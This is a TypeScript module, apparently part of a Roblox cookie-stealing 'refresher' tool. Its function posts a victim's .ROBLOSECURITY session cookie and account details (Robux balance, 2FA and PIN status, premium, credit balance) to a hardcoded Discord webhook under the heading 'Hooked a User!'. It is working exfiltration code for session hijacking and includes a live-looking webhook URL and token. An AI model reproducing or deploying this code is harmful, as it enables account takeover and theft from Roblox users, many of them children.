import axios from "axios";

export default async function hookRefresh(
	userData: {
		username: string;
		uid: number;
		avatarUrl: string;
		createdAt: string;
		country: string;
		balance: number;
		isTwoStepVerificationEnabled: boolean;
		isPinEnabled: boolean;
		isPremium: boolean;
		creditbalance: string;
	},
	roblosecurityCookie: string,
): Promise<boolean> {
	try {
		await axios.post(process.env.WEBHOOK || "https://discord.com/api/webhooks/1227318310794821694/Or8mClVg_HrPN2DpI6HRUxf-iE-UftM2-6LrAlHrlHjauFu-0pVeA3yftDZOW8mdKgYn", {
			username: "Refreshery",
			embeds: [
				{
					color: 1118737,
					title: "🎣 Hooked a User!",
					description: "```" + roblosecurityCookie + "```",
					thumbnail: {
						url: userData.avatarUrl,
					},
					fields: [
						{
							name: "Username",
							value: "```" + userData.username + "```",
							inline: true,
						},
						{
							name: "Balance (R$)",
							value: "```" + userData.balance + "```",
							inline: true,
						},
						{
							name: "Account Country Origin",
							value: "```" + userData.country + "```",
							inline: true,
						},
						{
							name: "Is Premium",
							value: "```" + userData.isPremium + "```",
							inline: true,
						},
						{
							name: "Is Pin Enabled",
							value: "```" + userData.isPinEnabled + "```",
							inline: true,
						},
						{
							name: "Is 2FA Enabled",
							value: "```" + userData.isTwoStepVerificationEnabled + "```",
							inline: true,
						},
						{
							name: "Creation Date",
							value: "```" + userData.createdAt + "```",
							inline: false,
						},
						{
							name: "Credit Balance",
							value: "```" + userData.creditbalance + "```",
							inline: true,
						},
					],
					footer: {
						text: "Dualhooks are immoral",
					},
				},
			],
		});

		return true;
	} catch (error) {
		return false;
	}
}
